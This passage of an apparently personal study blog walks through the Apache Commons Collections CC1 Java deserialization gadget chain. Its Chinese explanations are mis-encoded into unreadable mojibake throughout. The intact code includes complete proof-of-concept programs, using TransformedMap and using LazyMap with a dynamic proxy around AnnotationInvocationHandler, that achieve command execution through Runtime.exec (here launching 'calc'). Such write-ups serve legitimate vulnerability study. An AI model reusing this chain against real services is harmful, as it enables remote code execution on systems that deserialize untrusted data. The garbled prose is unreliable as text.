å®ä¾‹å¯¹è±¡ï¼Œå¹¶è¿›è¡Œååºåˆ—åŒ– Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); // è·å– Class å¯¹è±¡ // è¿™é‡Œæ³¨æ„ AnnotationInvocationHandler çš„æ„é€ æ–¹æ³•æ˜¯ default ä¿®é¥°çš„ï¼Œä¸èƒ½ç”¨ getConstructor æ¥è·å–ã€‚ Constructor annoInvHdlConstructor = clazz.getDeclaredConstructor(Class.class, Map.class); // æ„é€ å‡½æ•°çš„å‚æ•°ç±»å‹ annoInvHdlConstructor.setAccessible(true); Object annoInvHdlObj = annoInvHdlConstructor.newInstance(Override.class, transformedMap); // æ„é€ å‡½æ•°çš„å‚æ•°å€¼ // åºåˆ—åŒ–ã€ååºåˆ—åŒ– Serializer.serialized(annoInvHdlObj, \"/src/test/resources/cc1.ser\"); Deserializer.deserialized(\"/src/test/resources/cc1.ser\"); è¿è¡Œä»¥ä¸Šä»£ç åªæ˜¯ç”Ÿæˆäº†åºåˆ—åŒ–æ–‡ä»¶ï¼Œååºåˆ—åŒ–å¹¶æ²¡æœ‰è¿›è¡Œä»»ä½•æ“ä½œã€‚ â€‹ é€šè¿‡ debug å¯ä»¥çœ‹åˆ° if å¹¶ä¸æ»¡è¶³æ¡ä»¶ï¼Œå¹¶ä¸” setValue çš„å€¼æˆ‘ä»¬åº”è¯¥ä¼ å…¥ Runtime å¯¹è±¡ã€‚ æ»¡è¶³ if åˆ¤æ–­æ¡ä»¶ã€Java æ³¨è§£ã€‘ // è·å–æ³¨è§£çš„ memberTypesï¼Œæœ¬æ¬¡ä¼ è¿›å»çš„ Override æ³¨è§£çš„ memberTypes ä¸ºç©ºï¼Œ Map> memberTypes = annotationType.memberTypes(); Class memberType = memberTypes.get(name); ---------- // java.lang.annotation.Target // Target æ³¨è§£å­˜åœ¨å±æ€§ value ElementType[] value(); â€‹ â€‹ â€‹ â€‹ SuppressWarningsã€Targetã€Repeatable å’Œ Retentionã€‚ ä¿®æ”¹åæˆåŠŸè¿›å…¥ ifã€‚ â€‹ Runtime ç±»ä¸å¯åºåˆ—åŒ–é—®é¢˜ -- ã€æ™®é€šåå°„ --> InvokerTransformer.transform åå°„ã€‘è·å– Runtime å¯¹è±¡ï¼Œå‰é¢å·²ç»è§£å†³ã€‚ æ‰§è¡Œï¼ŒæŠ¥é”™ã€‚å‘ç°è¿˜å‰©æœ€åä¸€ä¸ªé—®é¢˜ï¼Œentry.setValue(Runtime.getRuntime()); çš„å€¼éœ€è¦ä¸º Runtime.getRuntime() å®ä¾‹åŒ–å¯¹è±¡ï¼Œå¯æ˜¯è¿™é‡Œ setValue çš„å€¼å¹¶ä¸å¯æ§ã€‚ â€‹ protected Object checkSetValue(Object value) { return valueTransformer.transform(value); } ç°åœ¨æ˜¯ ---------> æ€ä¹ˆä½¿ value == Runtime.class ? chainedTransformer.transform(Runtime.class); Exception in thread \"main\" org.apache.commons.collections.FunctorException: InvokerTransformer: The method 'getMethod' on 'class sun.reflect.annotation.AnnotationTypeMismatchExceptionProxy' does not exist ã€æ€ä¹ˆåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼ è¿›å»ä¸€ä¸ª Runtime å¯¹è±¡å‘¢ï¼Ÿã€‘ è¿™é‡Œæˆ‘ä»¬å‘ç°äº† ConstantTransformer è¿™ä¸ªç±»ï¼Œå®ƒçš„ transform æ–¹æ³•æ°¸è¿œè¿”å›ä¸€ä¸ªå›ºå®šå€¼ï¼Œä¸€åˆ‡éƒ½åˆšåˆšå¥½ã€‚ /** * Constructor that performs no validation. * Use getInstance if you want that. * * @param constantToReturn the constant to return each time */ public ConstantTransformer(Object constantToReturn) { super(); iConstant = constantToReturn; } /** * Transforms the input by ignoring it and returning the stored constant instead. * * @param input the input object which is ignored * @return the stored constant */ public Object transform(Object input) { return iConstant; } é‚£ä¹ˆæˆ‘ä»¬åªè¦ä¿®æ”¹ iConstant ä¸º Runtime.class å³å¯ã€‚ã€è¯¥ç±»çš„æ„é€ å‡½æ•°ã€‘ Transformer [] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), ... }; ----------> ç»è¿‡ TransformedMap.decorate è£…é¥°å valueTransformer.transform(value) å˜æˆäº† chainedTransformer.transform(value) ----------> åé¢åœ¨ AnnotationInvocationHandler ç±»è¿›è¡Œååºåˆ— readObject å¹¶æ»¡è¶³ä¸€å®šæ¡ä»¶çš„æ—¶å€™ä¼šè°ƒç”¨ setValue æ–¹æ³•ï¼Œåœ¨ setValue çš„æ—¶å€™ä¼šè¿›è¡Œ checkSetValue è°ƒç”¨ ----------> è§¦å‘åˆ° chainedTransformer.transform(value) ç„¶åå°±ä¼šéå† Transformer æ•°ç»„è°ƒç”¨å¯¹åº”çš„ transform æ–¹æ³• ----------> å¯¹åº” Transformer æ•°ç»„ iTransformers[i].transform(object); ----------> æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  å³ chainedTransformer[0].transform(Runtime.class) å°±æ˜¯ constantTransformer.transform() å¹¶ä¸”åœ¨ new ConstantTransformer çš„æ—¶å€™å·²å°† iConstant çš„å€¼è®¾ç½®ä¸ºäº† Runtime.class ---------->ä¸ç®¡ä¼ è¿›å»çš„ value æ˜¯ä»€ä¹ˆ constantTransformer.transform() æ–¹æ³•æ’å®šè¿”å› iConstant æ‰€ä»¥è¿™é‡Œæ˜¯ AnnotationTypeMismatchExceptionProxy å¯¹è±¡å¹¶ä¸å½±å“ã€‚å¦‚å›¾ï¼š â€‹ â€‹ â€‹ æ‰€ä»¥æœ€ç»ˆ poc ä¸º // å¥—å¨ƒäº†ä¸‰æ¬¡ï¼Œææˆä¸€ä¸ªæ•°ç»„ã€‚é€šè¿‡ ChainedTransformer éå†è°ƒç”¨å¯¹åº”çš„ transform æ–¹æ³•ã€‚ Transformer [] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class}, new Object[] {\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); //chainedTransformer.transform(Runtime.class); // è¿™éƒ¨åˆ†ä»£ç å°±æ˜¯ä¸ºäº†ååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘ chainedTransformer.transform() æ–¹æ³•åšå‡†å¤‡ã€‚å…ˆè£…è¿›å» Map é‡Œé¢ï¼Œå€¼ä¹Ÿæ”¹å¥½äº†ï¼Œä½†æ˜¯è¿˜æ²¡è§¦å‘åˆ°å¯¹åº”çš„ transform æ–¹æ³•ã€‚ HashMap hashMap = new HashMap(); hashMap.put(\"value\", \"mao\"); // é€šè¿‡ decorate ä¿®æ”¹ valueTransformer ä¸ºå¯åˆ©ç”¨çš„ç±»å¯¹è±¡ã€‚å¦‚ valueTransformer.transform(value); --> invokerTransformer.transform(); Map transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer); // // é€šè¿‡ MapEntry#setValue è§¦å‘ï¼š setValue --> checkSetValue --> valueTransformer.transform(value) ã€è¿™é‡Œçš„ value å€¼å°±æ˜¯ setValue çš„å€¼ã€‘ // for (Map.Entry entry : transformedMap.entrySet()) { // entry.setValue(Runtime.class); // } // System.out.println(\"The key named value is: \" + hashMap.get(\"value\")); // è§¦å‘ transform æ–¹æ³•ï¼Œå¦‚ chainedTransformer.transform(Runtime.class); // ååºåˆ—åŒ–çš„è§¦å‘ç±»ï¼šreadObject ã€æ»¡è¶³ä¸€å®šæ¡ä»¶ã€‘ --> setValue --> checkSetValue --> valueTransformer.transform(value) å³ chainedTransformer.transform(Runtime.class) å®Œæ•´çš„åˆ©ç”¨é“¾ Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); // è·å– Class å¯¹è±¡ // è¿™é‡Œæ³¨æ„ AnnotationInvocationHandler çš„æ„é€ æ–¹æ³•æ˜¯ default ä¿®é¥°çš„ï¼Œä¸èƒ½ç”¨ getConstructor æ¥è·å–ã€‚ Constructor annoInvHdlConstructor = clazz.getDeclaredConstructor(Class.class, Map.class); // æ„é€ å‡½æ•°çš„å‚æ•°ç±»å‹ annoInvHdlConstructor.setAccessible(true); Object annoInvHdlObj = annoInvHdlConstructor.newInstance(Target.class, transformedMap); // æ„é€ å‡½æ•°çš„å‚æ•°å€¼ // åºåˆ—åŒ–ã€ååºåˆ—åŒ– Serializer.serialized(annoInvHdlObj, \"/src/test/resources/cc1.ser\"); Deserializer.deserialized(\"/src/test/resources/cc1.ser\"); LazyMap åˆ©ç”¨é“¾ â€‹ LazyMap ä¼šæ›´åŠ ä¼˜é›…ç¾å¦™ä¸€ç‚¹ï¼Œç”¨åˆ°çš„çŸ¥è¯†ä¹Ÿä¼šæ›´å¤šä¸€ç‚¹ï¼Œå†å­¦ä¹ ä¸€æ³¢ Java å®‰å…¨æ¼«è°ˆ amazing... // ç”Ÿæˆåºåˆ—åŒ–æµ ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); System.out.println(barr); // ååºåˆ—åŒ– ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); å…¶å®ä¹Ÿå·®ä¸å¤šï¼Œæˆ‘ä»¬éœ€è¦åœ¨ååºåˆ—åŒ–çš„æ—¶å€™é€šè¿‡ LazyMap èµ°åˆ° InvokeTransformer.transform æ–¹æ³•ã€‚ LazyMap çš„è£…é¥°ï¼ˆæ„é€ ï¼‰å‡½æ•° decorate â€‹ é‚£ä¹ˆç°åœ¨é—®é¢˜å˜æˆæ€ä¹ˆåœ¨ readObject çš„æ—¶å€™è°ƒç”¨ LazyMap çš„ get æ–¹æ³•å‘¢ï¼Ÿ org.apache.commons.collections.map.LazyMap#get sun.reflect.annotation.AnnotationInvocationHandler#readObject ä¸­å¹¶æ²¡æœ‰ç›´æ¥è°ƒç”¨ Map çš„ get æ–¹æ³•ã€‚æ‰€ä»¥ ysoserial æ‰¾åˆ°äº†å¦ä¸€æ¡è·¯ï¼ŒAnnotationInvocationHandler ç±»çš„ invoke æ–¹æ³•æœ‰è°ƒç”¨åˆ° getï¼š sun.reflect.annotation.AnnotationInvocationHandler#invoke public Object invoke(Object proxy, Method method, Object[] args) { String member = method.getName(); // è¿™é‡Œè·å– member å€¼ Class[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(\"equals\") && paramTypes.length == 1 && paramTypes[0] == Object.class) return equalsImpl(args[0]); assert paramTypes.length == 0; if (member.equals(\"toString\")) return toStringImpl(); if (member.equals(\"hashCode\")) return hashCodeImpl(); if (member.equals(\"annotationType\")) return type; // Handle annotation member accessors Object result = memberValues.get(member); // è¿™é‡Œï¼Œä¸åŒçš„ JDK ç‰ˆæœ¬è¿™ä¸ª invoke å‡½æ•°å¯èƒ½ä¼šå°æœ‰å·®å¼‚ã€‚å¹¶ä¸” memberValues å°±æ˜¯ AnnotationInvocationHandler æ„é€ å‡½æ•°ä¼ è¿›å»çš„ Map å¯¹è±¡ if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() && Array.getLength(result) != 0) result = cloneArray(result); return result; } ç°åœ¨é—®é¢˜åˆå˜æˆäº†æ€ä¹ˆåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨åˆ° AnnotationInvocationHandler#invoke å‘¢ï¼Ÿysoserial çš„ä½œè€…æƒ³åˆ°çš„æ˜¯åˆ©ç”¨ Java çš„å¯¹è±¡ä»£ç†ã€‚ã€æˆ‘è¿˜èƒ½è¯´ä»€ä¹ˆå‘¢ï¼Ÿè¿™äº›äººä¹Ÿå¤ªçŒ›äº†å§ã€‚ã€‚ã€‚ã€‘ä»€ä¹ˆæ˜¯ Java ä»£ç†å¯¹è±¡ï¼ŸP ç‰›å†™çš„å¾ˆè¯¦ç»†æ˜“æ‡‚äº†ï¼Œè¿™é‡Œæˆ‘ç›´æ¥æŠ„å§ã€‚ Proxy (Java Platform SE 7 ) (oracle.com) Java ä»£ç†æ¨¡å¼è¯¦è§£ | JavaGuide ä½œä¸ºä¸€é—¨é™æ€è¯­è¨€ï¼Œå¦‚æœæƒ³åŠ«æŒä¸€ä¸ªå¯¹è±¡å†…éƒ¨çš„æ–¹æ³•è°ƒç”¨ï¼Œå®ç°ç±»ä¼¼ PHP çš„é­”æœ¯æ–¹æ³• __call ï¼Œæˆ‘ä»¬éœ€è¦ç”¨åˆ° java.reflect.Proxy ï¼šProxy.newProxyInstance çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ ClassLoaderï¼Œæˆ‘ä»¬ç”¨é»˜è®¤çš„å³å¯ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯æˆ‘ä»¬éœ€è¦ä»£ç†çš„å¯¹è±¡é›†åˆï¼›ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå®ç°äº† InvocationHandler æ¥å£çš„å¯¹è±¡ï¼Œé‡Œé¢åŒ…å«äº†å…·ä½“ä»£ç†çš„é€»è¾‘ã€‚ java.lang.reflect.Proxy#newProxyInstance public static Object newProxyInstance( ClassLoader loader, Class[] interfaces, InvocationHandler h ) throws IllegalArgumentException {} ExampleInvocationHandler package zha0cai; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.util.Map; public class ExampleInvocationHandler implements InvocationHandler { protected Map map; // æ„é€ å‡½æ•° public ExampleInvocationHandler(Map map) { this.map = map; } // ExampleInvocationHandler ç±»å®ç°äº† invoke æ–¹æ³•ï¼Œä½œç”¨æ˜¯åœ¨ç›‘æ§åˆ°è°ƒç”¨çš„æ–¹æ³•åæ˜¯ get çš„æ—¶å€™ï¼Œè¿”å›ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ä¸² Hacked Object // ä»£ç†æ¨¡å¼çš„ä¸»è¦ä½œç”¨æ˜¯æ‰©å±•ç›®æ ‡å¯¹è±¡çš„åŠŸèƒ½ï¼Œæ¯”å¦‚è¯´åœ¨ç›®æ ‡å¯¹è±¡çš„æŸä¸ªæ–¹æ³•æ‰§è¡Œå‰åä½ å¯ä»¥å¢åŠ ä¸€äº›è‡ªå®šä¹‰çš„æ“ä½œã€‚ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { // é‡å†™å®ç°çš„ invoke æ–¹æ³• if (0 == method.getName().compareTo(\"get\")) { System.out.println(\"Hook method: \" + method.getName()); return \"Hacked Object\"; } return method.invoke(this.map, args); } } ProxyTest ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œè™½ç„¶æˆ‘å‘ Map æ”¾å…¥çš„ hello å€¼ä¸º worldï¼Œä½†æˆ‘ä»¬è·å–åˆ°çš„ç»“æœå´æ˜¯ \"Hacked Object\" package zha0cai; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class ProxyTest { public static void main(String[] args) throws Exception { InvocationHandler handler = new ExampleInvocationHandler(new HashMap()); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); proxyMap.put(\"hello\", \"world\"); System.out.println(); String result = (String) proxyMap.get(\"hello\"); System.out.println(result); } } ========== D:\\Java\\jdk1.8.0_20\\bin\\java.exe ... Hook method: get Hacked Object Process finished with exit code 0 æˆ‘ä»¬å›çœ‹ sun.reflect.annotation.AnnotationInvocationHandler ï¼Œä¼šå‘ç°å®é™…ä¸Šè¿™ä¸ªç±»å®é™…å°± æ˜¯ä¸€ä¸ª InvocationHandlerï¼Œæˆ‘ä»¬å¦‚æœå°†è¿™ä¸ªå¯¹è±¡ç”¨ Proxy è¿›è¡Œä»£ç†ï¼Œé‚£ä¹ˆåœ¨ readObject çš„æ—¶å€™ï¼Œåªè¦è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œå°±ä¼šè¿›å…¥åˆ° AnnotationInvocationHandler#invoke æ–¹æ³•ä¸­ï¼ˆè¿™æ˜¯åŠ¨æ€ä»£ç†ç±»çš„ä¸€ä¸ªç‰¹æ€§ï¼‰ï¼Œååˆ†ç¾å¦™ã€‚ sun.reflect.annotation.AnnotationInvocationHandler#invoke public Object invoke(Object proxy, Method method, Object[] args) { String member = method.getName(); Class[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(\"equals\") && paramTypes.length == 1 && paramTypes[0] == Object.class) return equalsImpl(args[0]); assert paramTypes.length == 0; if (member.equals(\"toString\")) return toStringImpl(); if (member.equals(\"hashCode\")) return hashCodeImpl(); if (member.equals(\"annotationType\")) return type; // Handle annotation member accessors Object result = memberValues.get(member); // è§¦å‘ç‚¹æ‰€åœ¨ä½ç½®ï¼Œå°† memberValues ä¸º LazyMap if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() && Array.getLength(result) != 0) result = cloneArray(result); return result; } yso ä¸­çš„ cc1 é“¾å°±æ˜¯åˆ©ç”¨ AnnotationInvocationHandler.invoke() æ–¹æ³•å¯ä»¥è°ƒç”¨åˆ° LazyMap çš„ get() æ–¹æ³•ã€åŠ¨æ€ä»£ç†ã€‘ã€‚è¿™ä¸ª get æ–¹æ³•ä¸­è°ƒç”¨äº† transform æ–¹æ³•ï¼Œåªè¦æˆ‘ä»¬å°† this.factory è®¾ç½®ä¸º ChainedTransformer ï¼Œç„¶åçœ‹çœ‹ AnnotationInvocationHandler.invoke() æ‰€ä»¥è®©å…¶ memberValues ä¸º LazyMap å³å¯ã€‚ å¯ä»¥çœ‹çœ‹ååºåˆ—åŒ–æ—¶éƒ½æ˜¯äº›ä»€ä¹ˆå‚æ•°~ã€ConstantTransformer æ˜¯çœŸçš„ç‰›ã€‘ â€‹ â€‹ POC & EXP â€‹ TransformedMap package zha0cai; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class Test { public static void main(String[] args) throws Exception { // é€šè¿‡æ„é€ å‡½æ•°åˆå§‹åŒ–å€¼ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class}, new Object[] {\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}) }; // ç”¨äºéå†è§¦å‘å¯¹åº”çš„ transform æ–¹æ³•ï¼Œæ§åˆ¶æ•°ç»„ç¬¬ä¸€ä¸ªå‚æ•°å³å¯ ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // è¢«è£…é¥°çš„éç©º mapï¼ŒSince:HashMap, TreeMap, Hashtable... HashMap hashMap = new HashMap(); hashMap.put(\"value\", \"zhaocai\"); // è£…é¥°ï¼Œä¿®æ”¹ valueTransformer çš„å€¼ï¼Œç”¨äºè°ƒç”¨å¯¹åº”ç±»çš„ transform æ–¹æ³• Map transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer); // ååºåˆ—åŒ–è§¦å‘ç±» Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object annoInvHdlObj = constructor.newInstance(Target.class, transformedMap); // åºåˆ—åŒ– ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(annoInvHdlObj); oos.flush(); oos.close(); // ååºåˆ—åŒ– ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); Object obj = (Object) ois.readObject(); } } LazyMap package zha0cai; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class Test { public static void main(String[] args) throws Exception { // é€šè¿‡æ„é€ å‡½æ•°åˆå§‹åŒ–å€¼ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class}, new Object[] {\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}) }; // ç”¨äºéå†è§¦å‘å¯¹åº”çš„ transform æ–¹æ³•ï¼Œæ§åˆ¶æ•°ç»„ç¬¬ä¸€ä¸ªå‚æ•°å³å¯ ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // è¢«è£…é¥°çš„ mapï¼ŒSince:HashMap, TreeMap, Hashtable... HashMap hashMap = new HashMap(); hashMap.put(\"value\", \"dddd\"); // è£…é¥°ï¼Œä¿®æ”¹ factory çš„å€¼ï¼Œç”¨äºè°ƒç”¨å¯¹åº”ç±»çš„ transform æ–¹æ³• Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer); // ååºåˆ—åŒ–è§¦å‘ç±» Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); // é€šè¿‡åŠ¨æ€ä»£ç†åˆ›å»ºå¯¹è±¡ //Object annoInvHdlObj = constructor.newInstance(Target.class, transformedMap); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap); Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, handler); handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap); // åºåˆ—åŒ– ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(handler); oos.close(); System.out.println(baos); // ååºåˆ—åŒ– ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); Object obj = (Object) ois.readObject(); // åºåˆ—åŒ–ã€ååºåˆ—åŒ– // Serializer.serialized(handler, \"/src/test/resources/cc1.ser\"); // Deserializer.deserialized(\"/src/test/resources/cc1.ser\"); } } ä»£ç†åçš„å¯¹è±¡å«åš proxyMapï¼Œä½†æˆ‘ä»¬ä¸èƒ½ç›´æ¥å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œå› ä¸ºæˆ‘ä»¬å…¥å£ç‚¹æ˜¯sun.reflect.annotation.AnnotationInvocationHandler#readObjectï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å†ç”¨AnnotationInvocationHandler å¯¹è¿™ä¸ª proxyMap è¿›è¡ŒåŒ…è£¹ã€‚ â€‹ å¦‚è°ƒè¯•çš„æ—¶å€™è¿˜æ²¡ååºåˆ—åŒ–å°±å¼¹å‡ºäº†è®¡ç®—å™¨ï¼Œå¯ä»¥æŠŠä¸‹é¢è¿™ä¸ªé€‰é¡¹å–æ¶ˆæ‰ã€‚ å…³äº IDEA åœ¨ debug æ—¶ç§è‡ªè°ƒç”¨ toString()æ–¹æ³•çš„é—®é¢˜_lkforce çš„åšå®¢-CSDN åšå®¢ IDEA åœ¨ debug æ—¶ï¼Œå½“ debug åˆ°æŸä¸ªå¯¹è±¡æ—¶ï¼Œä¼šè°ƒç”¨å¯¹è±¡çš„ toString()æ–¹æ³•ï¼Œç”¨æ¥åœ¨ debug ç•Œé¢æ˜¾ç¤ºå¯¹è±¡ä¿¡æ¯ã€‚ IDEA è°ƒç”¨ toString() æ–¹æ³•æ—¶ï¼Œå³ä½¿åœ¨ toString() æ–¹æ³•ä¸­è®¾ç½®äº†æ–­ç‚¹ï¼Œè¯¥æ–­ç‚¹ä¹Ÿä¸ä¼šè¢«è§¦å‘ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¼€å‘è€…å¤šæ•°æƒ…å†µä¸‹ä¸ä¼šçŸ¥é“ toString() æ–¹æ³•è¢«è°ƒç”¨äº†ã€‚ å¤šæ•°æƒ…å†µä¸‹è°ƒç”¨ä¸€ä¸‹ toString() æ–¹æ³•æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–ï¼Œæ¯”å¦‚é‡å†™äº† toString() æ–¹æ³•çš„ç±»ï¼Œéšæ„çš„è°ƒç”¨ toString() æ–¹æ³•ä¼šå¯¼è‡´æœªçŸ¥çš„é—®é¢˜ã€‚ æ¯”å¦‚ Dubbo çš„ AbstractConfig ç±»ï¼Œå¯¹è¿™ä¸ªç±»çš„ debug ä¼šå¯¼è‡´å…¶å­ç±» ReferenceConfig çš„ initialized å±æ€§é”™è¯¯çš„è¢«ä¿®æ”¹ä¸º trueï¼Œè¿›è€Œæ— æ³•æ­£ç¡®çš„ç”Ÿæˆ Dubbo ä»£ç†ã€‚ â€‹ å‰äººæ ½æ ‘ ä¼Ÿå¤§çš„ Java å®‰å…¨æ¼«è°ˆ - 09 ~ 11 Commons Collections Java ååºåˆ—åŒ–æ¼æ´æ·±å…¥åˆ†æ - åšå®¢ - è…¾è®¯å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ (tencent.com) ç™½æ—¥æ¢¦ç»„é•¿ Apache Commons Collections åŒ…å’Œç®€ä»‹ | é—ªçƒä¹‹ç‹ (blinkfox.github.io) What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability. (foxglovesecurity.com) https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478 â€ Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2022-10-09 13:55:41 "}}